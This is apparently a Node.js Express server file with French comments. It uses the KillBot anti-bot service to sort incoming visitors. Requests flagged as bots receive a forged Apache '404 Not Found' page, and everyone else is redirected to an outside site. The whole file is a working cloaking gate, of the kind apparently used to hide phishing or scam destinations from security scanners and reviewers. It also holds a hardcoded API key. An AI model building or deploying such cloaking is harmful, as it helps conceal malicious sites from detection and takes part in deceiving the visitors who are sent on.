// index.js

const express = require('express');
const KillBot = require('killbot.to');

const app = express();
const PORT = process.env.PORT || 3000;

// Clé KillBot
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

// Page HTML "faux 404"
const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server Port 80</address>
</body></html>
`;

app.get('/', (req, res) => {
  killBot.checkReq(req)
    .then(result => {
      if (result.block) {
        // Bloqué par KillBot → renvoie la fausse page 404
        return res.status(404).send(fake404);
      } else {
        // Autorisé → redirige vers https://maurpie.com
        return res.redirect('https://maurpie.com');
      }
    })
    .catch(error => {
      console.error('KillBot error:', error);
      return res.status(500).send('Internal Server Error');
    });
});

app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});